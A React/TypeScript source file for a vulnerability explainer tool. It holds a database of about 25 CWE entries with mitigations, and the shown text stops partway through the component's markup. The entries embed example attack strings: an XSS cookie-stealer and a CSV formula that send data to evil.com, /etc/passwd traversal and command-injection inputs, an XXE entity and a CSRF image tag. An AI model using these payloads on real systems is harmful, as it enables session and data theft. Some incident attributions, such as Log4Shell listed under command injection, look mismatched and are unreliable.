import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Search, Shield, AlertTriangle } from "lucide-react";

interface Vulnerability {
  id: string;
  name: string;
  aliases: string[];
  severity: "Critical" | "High" | "Medium" | "Low";
  category: string;
  description: string;
  impact: string;
  howItWorks: string;
  realWorldExample: string;
  mitigation: string[];
  references: string[];
}

const vulnDatabase: Vulnerability[] = [
  {
    id: "CWE-89", name: "SQL Injection", aliases: ["sqli", "sql injection"], severity: "Critical", category: "Injection",
    description: "SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing unauthorized data.",
    impact: "Complete database compromise, data theft, data modification or deletion, authentication bypass, and in some cases, OS command execution.",
    howItWorks: "An attacker inserts SQL code into input fields (login forms, search bars, URL parameters). If the application concatenates user input directly into SQL queries without proper sanitization, the injected SQL executes with the application's database privileges.\n\nExample vulnerable code:\nSELECT * FROM users WHERE username = '" + "' OR '1'='1" + "' AND password = 'anything'\n\nThis always returns true, bypassing authentication.",
    realWorldExample: "The 2017 Equifax breach exposed 147 million records through an Apache Struts vulnerability. SQL injection remains the #1 injection attack type, responsible for countless data breaches.",
    mitigation: ["Use parameterized queries (prepared statements) — NEVER concatenate user input into SQL", "Use an ORM (Sequelize, Prisma, SQLAlchemy) which parameterizes by default", "Apply input validation and whitelist expected patterns", "Implement least-privilege database accounts", "Use Web Application Firewall (WAF) rules as defense-in-depth", "Regularly test with tools like sqlmap or Burp Suite"],
    references: ["OWASP: A03:2021 Injection", "CWE-89: SQL Injection", "NIST NVD"]
  },
  {
    id: "CWE-79", name: "Cross-Site Scripting (XSS)", aliases: ["xss", "cross site scripting"], severity: "High", category: "Injection",
    description: "XSS attacks occur when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute scripts in the victim's browser.",
    impact: "Session hijacking, cookie theft, keylogging, phishing, defacement, and malware distribution. Can lead to full account takeover.",
    howItWorks: "Three types:\n\n1. Reflected XSS: Malicious script is reflected off a web server (e.g., in search results, error messages)\n2. Stored XSS: Script is permanently stored on the target server (e.g., in comments, forum posts)\n3. DOM-based XSS: Vulnerability exists in client-side code rather than server-side\n\nExample: <script>document.location='https://evil.com/steal?c='+document.cookie</script>",
    realWorldExample: "In 2018, a stored XSS vulnerability in British Airways' website was exploited by the Magecart group, stealing payment data from 380,000 customers.",
    mitigation: ["Encode output — HTML-encode all user data before rendering", "Use Content Security Policy (CSP) headers", "Use modern frameworks (React, Vue) that auto-escape by default", "Sanitize HTML input with libraries like DOMPurify", "Set HttpOnly and Secure flags on cookies", "Validate and sanitize all user inputs on the server side"],
    references: ["OWASP: A03:2021 Injection", "CWE-79: Cross-site Scripting", "MDN: Content Security Policy"]
  },
  {
    id: "CWE-352", name: "Cross-Site Request Forgery (CSRF)", aliases: ["csrf", "xsrf", "cross site request forgery"], severity: "High", category: "Session",
    description: "CSRF forces an authenticated user to submit a request to a web application against which they are currently authenticated, without their knowledge or consent.",
    impact: "Unauthorized actions on behalf of the victim: changing email/password, making purchases, transferring funds, modifying data.",
    howItWorks: "The attacker crafts a malicious page containing a hidden form or image tag that triggers a request to the target application. When the victim visits this page while logged into the target app, the browser automatically includes their session cookies with the forged request.\n\nExample: <img src='https://bank.com/transfer?to=attacker&amount=10000' />",
    realWorldExample: "In 2008, a CSRF vulnerability in Netflix allowed attackers to change account details of any logged-in user by embedding a malicious form on a third-party website.",
    mitigation: ["Implement anti-CSRF tokens (synchronizer token pattern)", "Use SameSite cookie attribute (Lax or Strict)", "Verify Origin and Referer headers", "Require re-authentication for sensitive actions", "Use CORS properly to restrict cross-origin requests"],
    references: ["OWASP: A01:2021 Broken Access Control", "CWE-352: CSRF"]
  },
  {
    id: "CWE-287", name: "Broken Authentication", aliases: ["authentication bypass", "broken auth", "credential stuffing"], severity: "Critical", category: "Authentication",
    description: "Application functions related to authentication and session management are implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens.",
    impact: "Complete account takeover, identity theft, unauthorized access to sensitive data and functionality.",
    howItWorks: "Common attack vectors:\n\n1. Credential stuffing: Using leaked username/password pairs from other breaches\n2. Brute force: Systematic password guessing\n3. Session fixation: Forcing a known session ID onto a user\n4. Weak password recovery: Exploiting password reset flows\n5. Token theft: Stealing JWT or session tokens",
    realWorldExample: "The 2016 Uber breach compromised 57 million records when attackers found AWS credentials hardcoded in a GitHub repository, bypassing all authentication.",
    mitigation: ["Implement multi-factor authentication (MFA)", "Never ship default credentials", "Enforce strong password policies with breach checks (HaveIBeenPwned API)", "Implement account lockout with progressive delays", "Use secure session management (regenerate session IDs after login)", "Hash passwords with bcrypt, scrypt, or Argon2"],
    references: ["OWASP: A07:2021 Authentication Failures", "CWE-287: Improper Authentication", "NIST 800-63B: Digital Identity Guidelines"]
  },
  {
    id: "CWE-918", name: "Server-Side Request Forgery (SSRF)", aliases: ["ssrf", "server side request forgery"], severity: "High", category: "Injection",
    description: "SSRF occurs when an application fetches a remote resource based on a user-supplied URL without proper validation, allowing attackers to access internal services.",
    impact: "Access to internal services, cloud metadata endpoints (AWS IAM credentials), port scanning of internal networks, and potential remote code execution.",
    howItWorks: "The attacker supplies or modifies a URL that the server-side code reads or submits data to. By targeting internal addresses (localhost, 169.254.169.254 for cloud metadata, internal IPs), the attacker can:\n\n1. Read cloud credentials from metadata APIs\n2. Access internal admin panels\n3. Scan internal ports and services\n4. Bypass firewalls and access controls",
    realWorldExample: "The 2019 Capital One breach exploited an SSRF vulnerability in a WAF to access AWS metadata credentials, exposing 106 million customer records.",
    mitigation: ["Validate and sanitize all user-supplied URLs", "Use allowlists for permitted domains and IP ranges", "Block requests to private/internal IP ranges (10.x, 172.16-31.x, 192.168.x)", "Block cloud metadata endpoints (169.254.169.254)", "Use a dedicated HTTP client with timeout and redirect limits", "Implement network segmentation"],
    references: ["OWASP: A10:2021 SSRF", "CWE-918: Server-Side Request Forgery"]
  },
  {
    id: "CWE-502", name: "Insecure Deserialization", aliases: ["deserialization", "object injection", "pickle exploit"], severity: "Critical", category: "Data Integrity",
    description: "Insecure deserialization occurs when an application deserializes data from untrusted sources without proper validation, potentially leading to remote code execution.",
    impact: "Remote code execution, replay attacks, injection attacks, privilege escalation, and denial of service.",
    howItWorks: "When applications deserialize (reconstruct objects from serialized data) untrusted input, attackers can manipulate the serialized data to:\n\n1. Execute arbitrary code during deserialization\n2. Modify object properties to escalate privileges\n3. Inject malicious objects into the application\n\nCommon in: Java (ObjectInputStream), Python (pickle), PHP (unserialize), .NET (BinaryFormatter)",
    realWorldExample: "The 2017 Apache Struts vulnerability (CVE-2017-5638) exploited insecure deserialization of Content-Type headers, leading to the Equifax breach.",
    mitigation: ["Never deserialize untrusted data", "Use safe serialization formats (JSON) instead of native serialization", "Implement integrity checks (digital signatures) on serialized objects", "Enforce strict type constraints during deserialization", "Monitor and alert on deserialization exceptions", "Use look-ahead deserialization to validate object types before construction"],
    references: ["OWASP: A08:2021 Software and Data Integrity Failures", "CWE-502: Deserialization of Untrusted Data"]
  },
  {
    id: "CWE-22", name: "Path Traversal", aliases: ["directory traversal", "dot dot slash", "lfi", "local file inclusion"], severity: "High", category: "Access Control",
    description: "Path traversal attacks use special characters (../) to access files and directories stored outside the intended directory, potentially exposing sensitive system files.",
    impact: "Reading sensitive files (/etc/passwd, configuration files, source code), and in some cases writing files to arbitrary locations.",
    howItWorks: "The attacker manipulates file paths by injecting directory traversal sequences:\n\nVulnerable URL: https://app.com/files?name=report.pdf\nAttack: https://app.com/files?name=../../../etc/passwd\n\nThe server resolves the path and returns the system file instead of the intended document.",
    realWorldExample: "In 2020, a path traversal vulnerability in Citrix ADC (CVE-2019-19781) was widely exploited to access sensitive configuration files and achieve remote code execution.",
    mitigation: ["Validate user input against an allowlist of permitted file names", "Use a chroot jail or sandboxed file system", "Canonicalize paths and verify they remain within the intended directory", "Never use user input directly in file system operations", "Implement proper access controls on the file system level"],
    references: ["OWASP: A01:2021 Broken Access Control", "CWE-22: Path Traversal"]
  },
  {
    id: "CWE-312", name: "Sensitive Data Exposure", aliases: ["data exposure", "plaintext storage", "data leak"], severity: "High", category: "Cryptography",
    description: "When applications do not adequately protect sensitive data (financial data, PII, credentials) through encryption at rest and in transit, attackers can steal or modify the data.",
    impact: "Identity theft, financial fraud, regulatory violations (GDPR, HIPAA, PCI-DSS), and reputational damage.",
    howItWorks: "Common scenarios:\n\n1. Transmitting data over HTTP instead of HTTPS\n2. Storing passwords in plaintext or with weak hashing (MD5, SHA1)\n3. Using weak or outdated encryption algorithms\n4. Exposing sensitive data in logs, error messages, or URLs\n5. Improper key management (hardcoded keys, keys in source code)",
    realWorldExample: "In 2013, Adobe suffered a breach exposing 153 million user records with passwords encrypted using 3DES in ECB mode — an inadequate encryption method that made the passwords easily recoverable.",
    mitigation: ["Encrypt all data in transit using TLS 1.2+", "Hash passwords with Argon2, bcrypt, or scrypt", "Encrypt sensitive data at rest using AES-256", "Classify data and apply appropriate protection levels", "Never log sensitive data (PII, credentials, tokens)", "Use proper key management (HSM, vault, KMS)", "Implement HSTS headers to force HTTPS"],
    references: ["OWASP: A02:2021 Cryptographic Failures", "CWE-312: Cleartext Storage", "PCI DSS v4.0"]
  },
  {
    id: "CWE-78", name: "OS Command Injection", aliases: ["command injection", "shell injection", "rce"], severity: "Critical", category: "Injection",
    description: "OS Command Injection allows attackers to execute arbitrary operating system commands on the server by injecting malicious input into system shell calls.",
    impact: "Full server compromise, data exfiltration, lateral movement across the network, installation of backdoors and malware.",
    howItWorks: "When an application passes user-supplied input to system shell commands (exec, system, popen) without sanitization:\n\nVulnerable code:\nos.system('ping ' + user_input)\n\nAttack input: 127.0.0.1; cat /etc/passwd\n\nThe semicolon terminates the ping command and executes cat, exposing system files.",
    realWorldExample: "In 2021, the Log4Shell vulnerability (CVE-2021-44228) in Apache Log4j allowed remote code execution via JNDI lookups, affecting millions of applications worldwide.",
    mitigation: ["Never pass user input directly to OS commands", "Use language-native APIs instead of shell commands (e.g., subprocess with array args in Python)", "Implement strict input validation with allowlists", "Run applications with least-privilege OS accounts", "Use containers and sandboxing to limit blast radius", "Deploy runtime application self-protection (RASP)"],
    references: ["OWASP: A03:2021 Injection", "CWE-78: OS Command Injection", "MITRE ATT&CK: T1059"]
  },
  {
    id: "CWE-611", name: "XML External Entity (XXE)", aliases: ["xxe", "xml injection", "xml external entity"], severity: "High", category: "Injection",
    description: "XXE attacks exploit XML parsers that process external entity references, allowing attackers to read local files, perform SSRF, or cause denial of service.",
    impact: "Reading sensitive server files, SSRF to internal services, denial of service via recursive entity expansion (Billion Laughs), and potential remote code execution.",
    howItWorks: "Attackers submit crafted XML with external entity declarations:\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n\nThe XML parser resolves the entity, reading the file contents into the response.",
    realWorldExample: "In 2018, an XXE vulnerability was discovered in the .NET framework's handling of XSLT transformations, affecting numerous Microsoft applications and services.",
    mitigation: ["Disable DTD processing and external entities in XML parsers", "Use less complex data formats like JSON where possible", "Patch and upgrade XML processors and libraries", "Implement server-side input validation and sanitization", "Use SAST tools to detect XXE patterns in code"],
    references: ["OWASP: A05:2021 Security Misconfiguration", "CWE-611: XXE", "NIST NVD"]
  },
  {
    id: "CWE-434", name: "Unrestricted File Upload", aliases: ["file upload", "malicious upload", "webshell upload"], severity: "Critical", category: "Input Validation",
    description: "When an application allows users to upload files without proper validation, attackers can upload malicious files such as web shells, malware, or scripts.",
    impact: "Remote code execution via web shell, server compromise, malware distribution, storage exhaustion, and defacement.",
    howItWorks: "Attack steps:\n\n1. Attacker uploads a file with a server-executable extension (e.g., .php, .jsp, .aspx)\n2. The server stores it in a web-accessible directory\n3. Attacker navigates to the uploaded file URL\n4. The server executes the malicious code\n\nBypass techniques include: double extensions (file.php.jpg), null bytes (file.php%00.jpg), MIME type spoofing, and content-type manipulation.",
    realWorldExample: "In 2020, a file upload vulnerability in the WordPress File Manager plugin (CVE-2020-25213) was exploited to upload web shells, affecting 700,000+ websites.",
    mitigation: ["Validate file type using magic bytes, not just extension or MIME type", "Store uploaded files outside the web root", "Rename uploaded files with random generated names", "Set strict file size limits", "Scan uploads with antivirus/malware detection", "Serve uploaded files through a separate domain or CDN", "Remove execute permissions from upload directories"],
    references: ["OWASP: A04:2021 Insecure Design", "CWE-434: Unrestricted Upload"]
  },
  {
    id: "CWE-269", name: "Privilege Escalation", aliases: ["privesc", "privilege escalation", "idor", "broken access control"], severity: "Critical", category: "Access Control",
    description: "Privilege escalation occurs when a user gains access to resources or capabilities beyond their authorized permissions, either vertically (gaining higher privileges) or horizontally (accessing other users' data).",
    impact: "Unauthorized access to admin functionality, other users' data, sensitive operations, and complete system takeover.",
    howItWorks: "Vertical escalation: A regular user accesses admin endpoints:\nGET /api/admin/users (no role check on server)\n\nHorizontal escalation (IDOR): A user accesses another user's data by modifying identifiers:\nGET /api/orders/12345 → GET /api/orders/12346\n\nThe server fails to verify the requesting user owns the resource.",
    realWorldExample: "In 2019, a privilege escalation bug in Facebook allowed attackers to gain admin access to Facebook Pages they didn't own, affecting millions of pages.",
    mitigation: ["Implement server-side authorization checks on every request", "Use indirect object references instead of direct database IDs", "Apply deny-by-default access control policies", "Enforce role-based access control (RBAC) or attribute-based access control (ABAC)", "Log and monitor privilege escalation attempts", "Regularly audit access control rules and permissions"],
    references: ["OWASP: A01:2021 Broken Access Control", "CWE-269: Improper Privilege Management", "CWE-639: IDOR"]
  },
  {
    id: "CWE-798", name: "Hardcoded Credentials", aliases: ["hardcoded password", "hardcoded secret", "embedded credentials", "secret in code"], severity: "High", category: "Authentication",
    description: "Hardcoded credentials occur when passwords, API keys, tokens, or cryptographic keys are embedded directly in source code, configuration files, or compiled binaries.",
    impact: "Unauthorized access to systems and services, credential exposure through source code repositories, inability to rotate credentials without code changes.",
    howItWorks: "Developers embed secrets directly in code for convenience:\n\nconst API_KEY = 'sk-live-abc123xyz789';\nconst DB_PASSWORD = 'admin123';\n\nThese secrets end up in version control (Git), compiled artifacts, container images, and client-side bundles, where they can be easily discovered.",
    realWorldExample: "In 2022, Toyota disclosed that a contractor had accidentally published a credential to a public GitHub repository, exposing customer data for nearly 5 years.",
    mitigation: ["Use environment variables or secret management systems (Vault, AWS Secrets Manager)", "Implement pre-commit hooks to scan for secrets (git-secrets, trufflehog)", "Rotate all credentials that may have been exposed", "Use .gitignore to exclude configuration files with secrets", "Conduct regular repository scans for leaked credentials", "Use short-lived tokens and service accounts instead of static credentials"],
    references: ["OWASP: A07:2021 Authentication Failures", "CWE-798: Use of Hardcoded Credentials"]
  },
  {
    id: "CWE-327", name: "Weak Cryptography", aliases: ["weak encryption", "broken crypto", "md5", "sha1", "des", "rc4"], severity: "High", category: "Cryptography",
    description: "Using outdated, weak, or improperly implemented cryptographic algorithms that can be broken or bypassed by attackers.",
    impact: "Data decryption, forged signatures, authentication bypass, and compliance violations.",
    howItWorks: "Common weaknesses:\n\n1. Weak hashing: MD5 and SHA1 are vulnerable to collision attacks\n2. Weak encryption: DES, 3DES, RC4 have known vulnerabilities\n3. ECB mode: Reveals patterns in encrypted data\n4. No salt: Makes rainbow table attacks feasible\n5. Short keys: RSA < 2048 bits, AES < 128 bits\n\nExample: MD5('password') always produces the same hash, making it trivially reversible with lookup tables.",
    realWorldExample: "In 2017, Google demonstrated the first practical SHA-1 collision (SHAttered), proving SHA-1 is unsuitable for security purposes. Many certificate authorities had already been using SHA-1 for TLS certificates.",
    mitigation: ["Use AES-256-GCM for symmetric encryption", "Use RSA-2048+ or Ed25519 for asymmetric operations", "Use SHA-256 or SHA-3 for hashing", "Use Argon2id for password hashing", "Always use authenticated encryption modes (GCM, CCM)", "Implement proper key rotation and management", "Follow NIST cryptographic standards"],
    references: ["OWASP: A02:2021 Cryptographic Failures", "CWE-327: Broken Crypto Algorithm", "NIST SP 800-131A"]
  },
  {
    id: "CWE-1021", name: "Clickjacking", aliases: ["clickjacking", "ui redressing", "frame injection"], severity: "Medium", category: "UI Security",
    description: "Clickjacking tricks users into clicking on hidden elements by overlaying transparent frames on legitimate-looking pages, causing unintended actions.",
    impact: "Unauthorized actions (liking pages, enabling cameras, making purchases), credential theft, and malware installation.",
    howItWorks: "The attacker creates a page with an invisible iframe loading the target site:\n\n<iframe src=\"https://target.com/delete-account\"\n  style=\"opacity:0; position:absolute; top:0; left:0;\"\n  width=\"100%\" height=\"100%\">\n</iframe>\n<button style=\"position:relative;\">Click to win a prize!</button>\n\nWhen the victim clicks the visible button, they actually click the hidden iframe's delete button.",
    realWorldExample: "In 2015, a clickjacking attack on Flash Player's settings manager allowed attackers to enable users' webcams and microphones without their knowledge.",
    mitigation: ["Set X-Frame-Options header to DENY or SAMEORIGIN", "Use Content-Security-Policy frame-ancestors directive", "Implement frame-busting JavaScript as a fallback", "Require user confirmation for sensitive actions (not just a single click)", "Use SameSite cookies to prevent cross-site embedding"],
    references: ["OWASP: Clickjacking Defense Cheat Sheet", "CWE-1021: Improper Restriction of Rendered UI Layers"]
  },
  {
    id: "CWE-776", name: "XML Bomb (Billion Laughs)", aliases: ["xml bomb", "billion laughs", "entity expansion", "dos xml"], severity: "Medium", category: "Denial of Service",
    description: "An XML bomb is a denial-of-service attack that uses recursive or exponentially expanding XML entity definitions to consume all available memory and CPU.",
    impact: "Server crash, denial of service, resource exhaustion, and potential cascading failures across dependent services.",
    howItWorks: "The attacker submits XML with nested entity definitions that expand exponentially:\n\n<!DOCTYPE bomb [\n  <!ENTITY a \"lol\">\n  <!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">\n  <!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">\n  ...\n]>\n<root>&i;</root>\n\nEach level multiplies by 10, so 9 levels = 10^9 (1 billion) copies of 'lol', consuming ~3 GB of memory.",
    realWorldExample: "XML bombs have affected numerous XML-processing services including SOAP web services, document processing pipelines, and CI/CD build systems that parse XML configurations.",
    mitigation: ["Disable DTD processing entirely when not needed", "Set entity expansion limits in XML parsers", "Implement memory and CPU limits for XML processing", "Use streaming XML parsers (SAX) instead of DOM parsers for large inputs", "Monitor resource usage and set processing timeouts"],
    references: ["CWE-776: Improper Restriction of Recursive Entity References", "OWASP XML Security Cheat Sheet"]
  },
  {
    id: "CWE-916", name: "Insufficient Password Hashing", aliases: ["weak hashing", "unsalted hash", "password storage"], severity: "High", category: "Cryptography",
    description: "Storing passwords using weak, fast, or unsalted hashing algorithms that can be easily reversed through brute force, rainbow tables, or dictionary attacks.",
    impact: "Mass password compromise from database breaches, credential reuse attacks across services, and regulatory non-compliance.",
    howItWorks: "Weak approaches:\n\n1. Plaintext: password stored as-is\n2. Simple hash: SHA256(password) — fast to brute force (billions/sec on GPU)\n3. Unsalted hash: identical passwords produce identical hashes\n4. Single iteration: one round of hashing is too fast\n\nModern GPUs can compute 10+ billion MD5 or 3+ billion SHA-256 hashes per second, cracking most passwords in minutes.",
    realWorldExample: "LinkedIn's 2012 breach exposed 6.5 million passwords stored as unsalted SHA-1 hashes. Within days, over 90% were cracked by security researchers.",
    mitigation: ["Use Argon2id (winner of Password Hashing Competition)", "Alternatively use bcrypt (cost factor ≥ 12) or scrypt", "Always use unique per-password salts (built into bcrypt/Argon2)", "Implement pepper (server-side secret added before hashing)", "Set work factors to take ~250ms per hash on your hardware", "Re-hash passwords with stronger algorithms during login"],
    references: ["OWASP: Password Storage Cheat Sheet", "CWE-916: Use of Password Hash With Insufficient Computational Effort"]
  },
  {
    id: "CWE-1236", name: "CSV Injection", aliases: ["csv injection", "formula injection", "spreadsheet injection"], severity: "Medium", category: "Injection",
    description: "CSV Injection occurs when user-controlled data is included in CSV exports without sanitization, allowing injection of spreadsheet formulas that execute when opened.",
    impact: "Data exfiltration via external requests, local file reading, and potential remote code execution through DDE (Dynamic Data Exchange) in Excel.",
    howItWorks: "An attacker enters formula-like data into application fields:\n\nName field: =HYPERLINK(\"https://evil.com/steal?d=\"&A1, \"Click here\")\nOr: =CMD|'/C calc'!A0  (DDE attack)\n\nWhen an admin exports data to CSV and opens it in Excel, the formulas execute automatically, potentially sending data to the attacker or running system commands.",
    realWorldExample: "Multiple bug bounty reports have documented CSV injection in platforms like HackerOne, Google Sheets integrations, and CRM systems that export user-provided data.",
    mitigation: ["Prefix cell values starting with =, +, -, @, \\t, \\r with a single quote (')", "Validate and sanitize all user inputs before including in exports", "Use proper CSV libraries that handle escaping", "Warn users about opening CSV files from untrusted sources", "Consider using safer export formats like JSON or XLSX with protection"],
    references: ["OWASP: CSV Injection", "CWE-1236: Improper Neutralization of Formula Elements"]
  },
  {
    id: "CWE-942", name: "CORS Misconfiguration", aliases: ["cors", "cors misconfiguration", "cross origin", "access control allow origin"], severity: "High", category: "Access Control",
    description: "Misconfigured Cross-Origin Resource Sharing (CORS) policies allow unauthorized domains to make authenticated requests to your API, enabling data theft.",
    impact: "Unauthorized data access, account takeover, sensitive data theft, and bypassing same-origin policy protections.",
    howItWorks: "Dangerous CORS configurations:\n\n1. Wildcard with credentials:\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n\n2. Reflecting the Origin header:\nOrigin: https://evil.com → Access-Control-Allow-Origin: https://evil.com\n\n3. Null origin allowance:\nAccess-Control-Allow-Origin: null\n\nAn attacker's page can then make authenticated API requests and read responses.",
    realWorldExample: "In 2017, a CORS misconfiguration in a major cryptocurrency exchange allowed attackers to steal API keys and funds by tricking users into visiting a malicious page.",
    mitigation: ["Never use wildcard (*) with Access-Control-Allow-Credentials: true", "Maintain a strict allowlist of permitted origins", "Never reflect the Origin header without validation", "Avoid allowing the null origin", "Limit Access-Control-Allow-Methods to required HTTP methods", "Set appropriate Access-Control-Max-Age values"],
    references: ["OWASP: A05:2021 Security Misconfiguration", "CWE-942: Overly Permissive CORS Policy", "MDN: CORS"]
  },
  {
    id: "CWE-347", name: "JWT Vulnerabilities", aliases: ["jwt", "json web token", "jwt attack", "token forgery"], severity: "High", category: "Authentication",
    description: "Improper implementation of JSON Web Tokens can allow attackers to forge tokens, bypass authentication, or escalate privileges.",
    impact: "Authentication bypass, privilege escalation, account takeover, and unauthorized access to protected resources.",
    howItWorks: "Common JWT attacks:\n\n1. Algorithm None: Setting alg to 'none' skips signature verification\n{\"alg\":\"none\"}.{\"sub\":\"admin\"}\n\n2. Algorithm confusion: Switching RS256 to HS256 and signing with the public key\n\n3. Weak secrets: Brute-forcing HMAC secrets\n\n4. Missing expiration: Tokens without exp claim never expire\n\n5. Unvalidated claims: Trusting role/admin claims without server-side checks",
    realWorldExample: "In 2020, a JWT vulnerability in Auth0 allowed attackers to bypass authentication by exploiting the algorithm confusion technique, affecting applications using the library.",
    mitigation: ["Always validate the algorithm server-side (never accept 'none')", "Use strong secrets for HMAC (256+ bits of entropy)", "Always set and validate exp (expiration) claims", "Use asymmetric algorithms (RS256, ES256) for distributed systems", "Validate all claims server-side, never trust client-provided roles", "Implement token revocation (blacklist or short-lived + refresh tokens)", "Use established JWT libraries, never implement your own"],
    references: ["OWASP: JSON Web Token Cheat Sheet", "CWE-347: Improper Verification of Cryptographic Signature", "RFC 7519"]
  },
  {
    id: "CWE-400", name: "Rate Limiting / DoS", aliases: ["rate limiting", "dos", "ddos", "denial of service", "brute force"], severity: "Medium", category: "Availability",
    description: "Lack of rate limiting allows attackers to overwhelm application resources through excessive requests, or brute-force credentials and tokens.",
    impact: "Service unavailability, resource exhaustion, successful brute-force attacks, financial damage from compute costs, and degraded experience for legitimate users.",
    howItWorks: "Without rate limiting:\n\n1. Brute force: Trying thousands of passwords per second\n2. API abuse: Making millions of API calls to exhaust quotas\n3. Application DoS: Targeting expensive operations (search, reports)\n4. Account enumeration: Testing email addresses at login/registration\n\nEven without a botnet, a single machine can send thousands of HTTP requests per second.",
    realWorldExample: "In 2016, a massive DDoS attack using the Mirai botnet targeted DNS provider Dyn, taking down major websites including Twitter, Netflix, and Reddit for hours.",
    mitigation: ["Implement rate limiting per IP, user, and API key", "Use exponential backoff for authentication failures", "Deploy a WAF with DDoS protection (Cloudflare, AWS Shield)", "Implement CAPTCHA for sensitive endpoints after threshold", "Use connection timeouts and request size limits", "Monitor and alert on unusual traffic patterns", "Implement circuit breakers for downstream service protection"],
    references: ["OWASP: Denial of Service Cheat Sheet", "CWE-400: Uncontrolled Resource Consumption"]
  },
  {
    id: "CWE-1104", name: "Supply Chain Attack", aliases: ["supply chain", "dependency confusion", "typosquatting", "compromised package"], severity: "Critical", category: "Supply Chain",
    description: "Supply chain attacks compromise software by targeting less-secure elements in the development pipeline — dependencies, build tools, CI/CD systems, or update mechanisms.",
    impact: "Backdoor installation, data theft, ransomware deployment, cryptocurrency mining, and compromise of all downstream users.",
    howItWorks: "Attack vectors:\n\n1. Dependency confusion: Publishing malicious packages with internal package names to public registries\n2. Typosquatting: Creating packages with names similar to popular ones (lodash → lodahs)\n3. Compromised maintainers: Taking over abandoned packages or bribing maintainers\n4. Build pipeline attacks: Injecting malicious code during CI/CD\n5. Malicious updates: Compromising a legitimate package's update mechanism",
    realWorldExample: "The 2020 SolarWinds attack compromised the Orion build system, distributing backdoored updates to 18,000+ organizations including US government agencies and Fortune 500 companies.",
    mitigation: ["Pin dependency versions and use lock files (package-lock.json, yarn.lock)", "Enable npm audit / Snyk / Dependabot for vulnerability scanning", "Use private registries with scoped packages for internal code", "Verify package integrity with checksums and signatures", "Review dependency changes in pull requests", "Implement Software Bill of Materials (SBOM)", "Use tools like Socket.dev to detect suspicious package behavior"],
    references: ["OWASP: A06:2021 Vulnerable and Outdated Components", "CWE-1104: Use of Unmaintained Third-Party Components"]
  },
  {
    id: "CWE-532", name: "Information Leakage via Logs", aliases: ["log injection", "sensitive data in logs", "log leakage", "verbose errors"], severity: "Medium", category: "Information Disclosure",
    description: "Applications that log sensitive information (passwords, tokens, PII, credit cards) or expose verbose error messages can leak data to attackers who gain access to logs.",
    impact: "Credential exposure, PII leakage, compliance violations (GDPR, HIPAA), and information useful for further attacks.",
    howItWorks: "Common scenarios:\n\n1. Logging authentication requests with passwords:\nlog.info('Login attempt: user=' + email + ' pass=' + password)\n\n2. Stack traces in production responses:\n{\"error\": \"NullPointerException at UserService.java:142\", \"stack\": \"...\"}\n\n3. Logging API keys and tokens in request headers\n\n4. Verbose database error messages revealing schema details",
    realWorldExample: "In 2018, Twitter disclosed that a bug caused passwords to be written to an internal log in plaintext before hashing, affecting 330 million users who were advised to change their passwords.",
    mitigation: ["Never log passwords, tokens, API keys, or credit card numbers", "Implement structured logging with automatic PII redaction", "Use generic error messages in production (hide stack traces)", "Classify log levels appropriately (DEBUG vs PRODUCTION)", "Encrypt log storage and restrict access with RBAC", "Implement log rotation and retention policies", "Audit logging configurations regularly"],
    references: ["OWASP: A09:2021 Security Logging and Monitoring Failures", "CWE-532: Information Exposure Through Log Files"]
  },
  {
    id: "CWE-601", name: "Open Redirect", aliases: ["open redirect", "url redirect", "redirect vulnerability"], severity: "Medium", category: "Input Validation",
    description: "Open redirect vulnerabilities allow attackers to redirect users from a trusted site to a malicious site by manipulating URL parameters.",
    impact: "Phishing attacks using trusted domain reputation, credential theft, OAuth token theft, and malware distribution.",
    howItWorks: "Vulnerable URL pattern:\nhttps://trusted-bank.com/redirect?url=https://evil-phishing.com/login\n\nThe trusted domain appears in the URL, making the phishing page appear legitimate. This is especially dangerous in OAuth flows:\n\nhttps://auth.example.com/authorize?\n  client_id=app&\n  redirect_uri=https://evil.com/callback\n\nThe attacker receives the OAuth authorization code or token.",
    realWorldExample: "Open redirect vulnerabilities have been found in Google, Facebook, and major financial institutions. They are commonly chained with OAuth flows to steal authentication tokens.",
    mitigation: ["Use an allowlist of permitted redirect URLs", "Avoid passing redirect URLs as parameters", "Use indirect references (map IDs to URLs server-side)", "Validate that redirect URLs belong to your domain", "Display a warning page before redirecting to external URLs", "For OAuth, strictly validate redirect_uri against registered URIs"],
    references: ["OWASP: Unvalidated Redirects and Forwards", "CWE-601: URL Redirection to Untrusted Site"]
  },
];

const severityColor: Record<string, string> = {
  Critical: "bg-destructive text-destructive-foreground",
  High: "bg-destructive/80 text-destructive-foreground",
  Medium: "bg-yellow-500 text-white",
  Low: "bg-muted text-muted-foreground",
};

const VulnExplainer = () => {
  const [search, setSearch] = useState("");
  const [selected, setSelected] = useState<Vulnerability | null>(null);

  const filtered = search.trim()
    ? vulnDatabase.filter(v =>
        v.name.toLowerCase().includes(search.toLowerCase()) ||
        v.id.toLowerCase().includes(search.toLowerCase()) ||
        v.aliases.some(a => a.includes(search.toLowerCase())) ||
        v.category.toLowerCase().includes(search.toLowerCase())
      )
    : vulnDatabase;

  return (
    <div className="space-y-6">
      <div className="relative">
        <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
        <Input
          placeholder="Search by name, CWE ID, or keyword (e.g., SQL injection, XSS, CSRF)..."
          value={search}
          onChange={e => { setSearch(e.target.value); setSelected(null); }}
          className="pl-9"
        />
      </div>

      {!selected ? (
        <div className="space-y-2">
          <p className="text-sm text-muted-foreground">{filtered.length} vulnerabilities</p>
          {filtered.map(v => (
            <button
              key={v.id}
              onClick={() => setSelected(v)}
              className="w-full text-left bg-card border rounded-lg p-4 hover:border-primary transition-colors"
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Shield className="h-5 w-5 text-primary shrink-0" />
                  <div>
                    <p className="font-semibold text-foreground">{v.name}</p>
                    <p className="text-xs text-muted-foreground">{v.id} · {v.category}</p>
                  </div>
                </div>
